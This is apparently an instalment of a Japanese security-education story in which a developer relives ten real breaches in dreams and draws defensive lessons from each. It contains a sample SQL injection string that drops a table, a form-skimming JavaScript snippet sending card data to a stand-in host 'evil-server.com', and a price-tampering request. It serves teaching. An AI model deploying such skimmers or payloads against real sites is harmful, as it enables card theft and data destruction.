第7回:俺はセキュリティの悪夢を見る

― 過去の亡霊たちが教えてくれたこと ―

10の悪夢が俺に「セキュリティとは何か」を血と涙で教えてくれる

今日の物語

The・World村での激動の日々を終え、疲れ果てて眠りについた俺。

しかしその夜、俺は奇妙な夢を見る。

それは過去に実際に起きたセキュリティ事件の「当事者」として、その瞬間を追体験する悪夢だった。

SQLインジェクション、認証不備、フロントエンド改ざん…

10の悪夢が俺に「セキュリティとは何か」を血と涙で教えてくれる。

シーン0：眠りへの誘い

The・World村の障害対応を終え、俺はボロボロだった。

俺：「十の事件簿…毎週壊れる村…もう寝かせてくれ…」

机に突っ伏して意識が遠のく。

セキュリティ番「おい、ログアウトくらいしてから寝ろ…」

しかし俺の意識はすでに、深い深い眠りの底へ――。

第一の夢「漏れ出すカード番号」

― 2013年 ECサイトSQLインジェクション事件 ―

目を開けると、俺は見知らぬオフィスにいた。

画面には「インテリア通販サイト 管理画面」の文字。俺はこのECサイトの開発者らしい。

上司「おい、検索機能追加してくれ。急ぎで」

俺（夢の中）：「了解っす」

俺は検索クエリを実装する。文字列連結でSQLを組み立てる。

"SELECT * FROM users WHERE name = '" + userInput + "'"

俺（夢の中）：「よし、動いた。リリース！」

第一の夢：攻撃の瞬間

――数ヶ月後。画面に赤いアラートが点滅。

🚨 不正アクセス検知 🚨

ログを見ると、誰かが検索欄にこう入力していた。

' OR '1'='1'; DROP TABLE credit_cards; --

俺（夢の中）：「な…なんだこれ…データベースが…カード情報が…」

顧客のクレジットカード番号が次々と外部に流出していく。

数千件。氏名、住所、カード番号、有効期限…すべてが闇に消えていく。

【裁判所の声】「被告会社に対し、2,262万円の損害賠償を命じる」

俺：「うわあああああ！！」

第一の夢：教訓メモ

――目が覚める。冷や汗びっしょり。

俺：「夢…だよな…？　でも待て、これ確か実際にあった事件だ…」

教訓メモ（夢から覚めた俺のつぶやき）

✓ ユーザー入力を絶対に信用するな

✓ SQLはプレースホルダ（バインド機構）を使え

✓ 「動いた」と「安全」は全く別の話だ

実際の事件：2013年発生、2014年判決。顧客カード情報数千件流出、開発会社に2,262万円の損害賠償命令。

第二の夢「総当たりの恐怖」

― 2018年 PayPay不正利用事件 ―

再び眠りに落ちる俺。今度は真新しいオフィス。壁には「○○Pay」のロゴ。

PM「サービスローンチだ！20%還元キャンペーンで一気にユーザー獲得するぞ！」

俺（夢の中）：「クレジットカード登録機能、実装完了です！」

リリース当日。ダウンロード数がうなぎ登り。

俺（夢の中）：「すげぇ…バズってる…」

しかし数日後、異変が起きる。

第二の夢：ブルートフォース攻撃

セキュリティチーム「おい、CVV入力の試行回数がおかしい。同一カードに対して000から999まで順番に…」

画面に映し出される攻撃ログ。

CVV: 000 → 失敗 CVV: 001 → 失敗 CVV: 002 → 失敗 ... CVV: 847 → 成功！！

俺（夢の中）：「総当たり…！　でも待て、リトライ制限は…」

セキュリティチーム「ない。実装されてない」

俺（夢の中）：「3Dセキュアは…」

セキュリティチーム「ない」

ニュース速報：「○○Pay、大規模不正利用発覚。被害額数千万円規模か」

第二の夢：教訓メモ

――目が覚める。

俺：「はぁ…はぁ…入力回数制限…多要素認証…なんで実装しなかった…」

教訓メモ

✓ 認証には必ずレートリミット（試行回数制限）を

✓ ブルートフォース対策は設計段階から

✓ 「便利」と「安全」のバランスを最初から考えろ

✓ 3Dセキュアなどの追加認証は必須

実際の事件：2018年、CVV総当たり攻撃による大規模不正利用。被害全額補償、緊急でアプリ改修。

第三の夢「勝手に公開される私生活」

― 2018年 Facebookプライバシー設定バグ ―

次の夢。俺は巨大なSNS企業のオフィスにいる。壁には青いロゴ。

俺（夢の中）：「新機能のテスト完了。ロールアウトします」

その機能は「投稿のオーディエンス選択ツール」の改善。しかし俺は気づいていなかった。テスト中に入り込んだバグに。

リリースから数日後。

サポートチーム「ユーザーから問い合わせが殺到してます！『友人限定で投稿したはずが全体公開になってる』って！」

デフォルトの公開範囲設定が…「全員に公開」にリセットされるバグ。

約1,400万人のユーザーが影響を受けた

第三の夢：教訓メモ

ユーザーの悲鳴がタイムラインを埋め尽くす。

「私の日記が全世界に公開されてた…」

「家族写真が知らない人に見られてた…」

「プライベートな投稿が…」

俺：「なんでテストで気づかなかった…なんで…」

教訓メモ

✓ プライバシーに関わる機能は特に慎重に

✓ デフォルト設定は「安全側」に倒せ（Privacy by Default）

✓ 新機能は段階的にロールアウトして異常を検知しろ

✓ 回帰テストを徹底しろ

第四の夢「22行の悪意」

― 2018年 British Airways情報流出事件 ―

夢の中で、俺はロンドンの航空会社のIT部門にいた。

俺（夢の中）：「なんか最近、サーバーの挙動がおかしいような…」

ある日、決済ページのソースコードを確認して凍りつく。

見覚えのない22行のJavaScriptコードが埋め込まれていた

第四の夢：フロントエンド改ざん

// 攻撃者が仕込んだコード（イメージ） document.getElementById('payment-form') .addEventListener('submit', function() { var cardData = { number: document.getElementById('card-number').value, expiry: document.getElementById('expiry').value, cvv: document.getElementById('cvv').value }; // 攻撃者のサーバーに送信 fetch('https://evil-server.com/steal', { method: 'POST', body: JSON.stringify(cardData) }); });

俺（夢の中）：「フロントエンドが…改ざんされてる…！」

原因は複合的だった。

・外部委託先のVPNアカウントが侵害された（MFA未設定）

・特権IDのパスワードが平文でファイルに放置されていた

・本番環境でカード情報を平文ログに記録していた

約38万件の顧客データ流出。GDPR違反で2,000万ポンド（約28億円）の罰金

第四の夢：教訓メモ

俺：「フロントエンドのセキュリティ…CSP…SRI…改ざん検知…サプライチェーン攻撃…」

教訓メモ

✓ フロントエンドも攻撃対象になる（Magecart/Formjacking）

✓ Content Security Policy（CSP）で外部通信を制限しろ

✓ Subresource Integrity（SRI）でスクリプトの改ざんを検知

✓ サードパーティアクセスには必ずMFAを

✓ 特権情報を平文で放置するな

実際の事件：2018年、約38万件の顧客決済情報流出。GDPR違反で2,000万ポンド（約28億円）の罰金。

第五の夢「生年月日で乗っ取られる」

夢の中。日本の大手コンビニチェーンのオフィス。俺は新しいスマホ決済サービスの開発チームにいる。

PM「競合に負けるな！早くローンチだ！」

俺（夢の中）：「パスワードリセット機能、実装しました」

その仕様は単純だった。

1. メールアドレスを入力

2. 生年月日を入力

3. 新しいパスワードを設定

俺（夢の中）：「これでユーザーがパスワードを忘れても大丈夫ですね」

第五の夢：サービスの死

リリース当日。CM放映。「○○ペイ、始まる」

――3日後。

サポートに怒号の電話が殺到。

「勝手にチャージされてる！」

「知らない買い物の履歴が！」

「アカウントが乗っ取られた！」

攻撃者はターゲットのメールアドレスと生年月日（SNSで公開情報）を入手。

パスワードリセットを実行。本人確認？生年月日だけ。二段階認証？ない。

被害は808人、約5,500万円。1ヶ月後、サービス終了。わずか3ヶ月の生涯だった。

第五の夢：教訓メモ

俺：「二段階認証…多要素認証…公開情報を認証に使うな…」

教訓メモ

✓ パスワードリセットには強固な本人確認を

✓ 生年月日など推測可能な情報を認証に使うな

✓ 多要素認証（MFA）は必須

✓ セキュリティを後回しにしたサービスは死ぬ

実際の事件：2019年、約808人、約5,500万円の不正利用。サービス開始3ヶ月で廃止。

第六の夢「逃げられないXSS」

― 2020年 ユニクロアプリXSS脆弱性 ―

夢の中。大手アパレル企業のアプリ開発チーム。

俺（夢の中）：「アプリ内ブラウザでキャンペーンページを表示する機能、実装しました」

WebViewでHTMLを表示する。ユーザー名やクーポンコードも動的に埋め込む。

しかし俺は、エスケープ処理を忘れていた。

ある日、セキュリティ研究者から連絡。

「御社のアプリにXSS脆弱性があります。悪意あるサイトに誘導可能です」

JVN（脆弱性対策情報データベース）に掲載。緊急アップデート配信。

第六の夢：教訓メモ

俺：「XSSは死なない…どこにでも潜んでいる…」

教訓メモ

✓ WebViewでもXSSは起きる

✓ ユーザー入力は必ずエスケープ/サニタイズ

✓ CSP（Content Security Policy）を設定しろ

✓ 定期的な脆弱性診断を実施しろ

実際の事件：2020年、外部不正サイトへの誘導リスク。緊急アプリアップデート。

第七の夢「171万件の顔写真」

夢の中。マッチングアプリの運営会社。壁には「出会いを、もっと」のスローガン。

俺（夢の中）：「本人確認書類のアップロード機能、実装完了です」

ユーザーは運転免許証やパスポートの画像をアップロードする。それらはクラウドストレージに保存される。

ある日、異変に気づく。アクセスログに、大量のダウンロードリクエスト。

攻撃者はストレージの認証情報を何らかの方法で入手。正規のAPIを使って、大量の画像データをダウンロードしていた。

第七の夢：流出データ

流出件数：171万1,756件
内容：運転免許証（約6割）、健康保険証、パスポート…
氏名、顔写真、生年月日、住所…すべてが流出。

俺（夢の中）：「退会済みユーザーのデータも…なんで消してなかった…」

ユーザーの悲鳴。「私の免許証が…顔写真が…」

教訓メモ

✓ クラウドストレージのアクセス制御を厳格に

✓ 大量ダウンロードを検知するレート制限・アラート

✓ 保管データは暗号化しろ

✓ 不要になったデータは適切に削除しろ

✓ 退会ユーザーのデータ保持ポリシーを明確に

第八の夢「SaaSの連鎖崩壊」

夢の中。EC構築SaaSを提供する会社。多くの企業がこのプラットフォームでECサイトを運営している。

俺（夢の中）：「うちのシステムを使えば、簡単にECサイトが作れますよ」

80社近くがこのSaaSを利用していた。

ある日、基幹サーバーに異変。見知らぬプログラムが動いている。

XSS脆弱性を悪用した不正プログラムが、加盟各社のECサイトの決済ページに悪意あるスクリプトを注入していた。

被害は11社に拡大。流出件数は43万件以上。クレジットカード番号も含まれていた。

第八の夢：教訓メモ

俺：「SaaSの脆弱性は…利用者全員に波及する…」

教訓メモ

✓ SaaS/プラットフォームの脆弱性は利用者全体に波及する

✓ サプライチェーン全体でセキュリティを考えろ

✓ WAFだけでは防げない攻撃もある

✓ 定期的なペネトレーションテストを実施しろ

実際の事件：2021年、11社から43万件以上の顧客情報流出。サービス一時停止、セキュリティ体制見直し。

第九の夢「他人の戸籍が出てくる」

夢の中。俺は自治体向けシステムを開発する会社のエンジニア。マイナンバーカードを使ったコンビニ証明書交付システムを担当している。

俺（夢の中）：「住民票や戸籍謄本をコンビニで取得できる、便利なシステムです」

リリース後、システムは順調に稼働していた。しかしある日、複数の自治体から連絡。

「市民Aさんが自分の住民票を取ろうとしたら、市民Bさんの住民票が出てきました」

第九の夢：競合状態

調査の結果、システム高負荷時にセッション管理のバグが発覚。

メモリ開放が正しく行われず、直前の利用者のデータが次の利用者に紛れ込む競合状態。

川崎市、足立区、複数の自治体で同様の事故。

他人の氏名、本籍、家族構成…プライバシーの塊が、見知らぬ人に渡ってしまった。

総務省「富士通に対し厳重注意」
ニュース「マイナンバー制度への不安広がる」

教訓メモ

✓ 並行処理・セッション管理は細心の注意を

✓ 高負荷時の挙動を必ずテストしろ

✓ 排他制御、トランザクション管理を徹底

✓ 行政システムは特に信頼性が重要

第十の夢「0円で買い物し放題」

― 2024年 通販サイト決済改ざん詐取事件 ―

最後の夢。俺は通販サイトの開発者。

俺（夢の中）：「決済機能、実装完了。商品をカートに入れて、金額を計算して、決済APIに送信…」

しかし俺は、フロントエンドから送られてくる金額データをそのまま信用していた。

サーバー側での再計算？していなかった。

ある日、異常な注文が大量に発生。高額な商品券が、0円や1円で「購入」されている。

第十の夢：クライアント改ざん

調査の結果、攻撃者の手口が判明。ブラウザの開発者ツールで、決済リクエストの金額フィールドを書き換えていた。

本来: { "amount": 50000, "item": "商品券" } 改ざん後: { "amount": 0, "item": "商品券" }

サーバーは改ざんを検知せず、そのまま「決済完了」として処理。

被害総額：423万円分の商品券が詐取された

教訓メモ

✓ クライアントからのデータは絶対に信用するな

✓ 金額計算は必ずサーバーサイドで

✓ リクエストの改ざん検知（署名、ハッシュ）を実装しろ

✓ 異常な値（0円、負の数など）をバリデーションしろ

セキュリティの十戒

俺は壁に、夢で学んだ教訓を書き出していく。

セキュリティの十戒（1〜5）

一、「ユーザー入力を信用するな」

SQLインジェクション、XSS、改ざん…入力は常に敵だと思え。

二、「認証に手を抜くな」

多要素認証、レートリミット、強固な本人確認。認証の穴はサービスの死。

三、「デフォルトは安全側に倒せ」

公開より非公開、許可より拒否。最初から安全な設定を。

四、「クライアントを信じるな」

金額も権限もサーバーで再計算・再検証しろ。

五、「フロントエンドも守れ」

CSP、SRI、改ざん検知。フロントは攻撃の最前線だ。

セキュリティの十戒（6〜10）

六、「並行処理を侮るな」

セッション管理、排他制御、競合状態。高負荷時のテストを怠るな。

七、「サプライチェーンを意識しろ」

お前のコードだけじゃない。依存先、委託先、全部がセキュリティだ。

八、「データの一生を設計しろ」

保存、暗号化、アクセス制御、そして削除。データは預かりものだ。

九、「ログと監視を怠るな」

異常を検知できなければ、攻撃されていることすら分からない。

十、「セキュリティは設計段階から」

後付けの防御は穴だらけ。Security by Design。最初から考えろ。

技術的考察：攻撃手法の分類

インジェクション系

SQLインジェクション、XSS、コマンドインジェクション

認証・認可の不備
